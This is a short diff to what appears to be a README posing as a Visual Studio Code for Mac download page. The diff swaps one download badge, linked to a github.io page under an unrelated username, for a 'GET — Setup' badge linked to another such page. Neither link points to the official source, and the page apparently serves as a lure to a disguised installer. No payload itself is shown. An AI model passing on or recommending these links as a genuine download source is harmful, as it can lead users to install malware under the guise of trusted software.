@@ -4,11 +4,7 @@
 <img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/i/19d13b13-e0c9-488a-958b-8441de5e151e/dbedym2-687708f0-5fd7-4b42-a131-7d3983c86053.jpg" alt="Visual Studio Code Mac Logo" width="256" height="256">
 </div>
 
-<div align="center">
-<a href="https://waltersddance.github.io/.github/vscode">
-<img src="https://img.shields.io/badge/Download_Visual_Studio_Code_for_Mac-darkblue?style=for-the-badge&logo=apple" alt="Download Visual Studio Code for Mac">
-</a>
-</div>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://napieralaa597.github.io/.github/Visual-Studio-Code)
 
 ---
 
